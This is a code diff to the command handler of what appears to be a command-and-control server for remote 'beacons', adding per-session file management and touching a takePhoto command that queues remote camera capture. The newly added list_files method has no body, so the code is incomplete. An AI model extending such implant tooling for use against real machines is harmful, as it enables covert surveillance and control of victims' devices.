@@ -1,4 +1,5 @@
 from ServerDatabase.database import DatabaseClass
+from file_manager import FileManagerClass
 from .global_objects import (
     add_beacon_command_list,
     remove_beacon_list,
@@ -12,8 +13,9 @@ import colorama
 class BeaconCommandsClass:
     """Handles commands within a session"""
 
-    def __init__(self) -> None:
-        self.database = DatabaseClass()  # laods database class
+    def __init__(self, uuid) -> None:
+        self.database = DatabaseClass()  
+        self.file_manager = FileManagerClass(uuid)
         colorama.init(autoreset=True)  # resets colorama after each function
 
     def close_connection(self, userID) -> None:
@@ -82,7 +84,10 @@ class BeaconCommandsClass:
 
     def takePhoto(self, userID) -> None:
         add_beacon_command_list(userID, None, "snap", "")
-        return
+    
+    def list_files(self, ) -> None:
+
+        
 
     def list_db_commands(self, userID) -> None:
         for _, beacon_commands in command_list.items():
@@ -108,5 +113,5 @@ class BeaconCommandsClass:
                 continue
             else:
                 break
-        add_beacon_command_list(userID, None, "beacon_configueration", data)
+        add_beacon_command_list(userID, None, "beacon_configuration", data)
         return
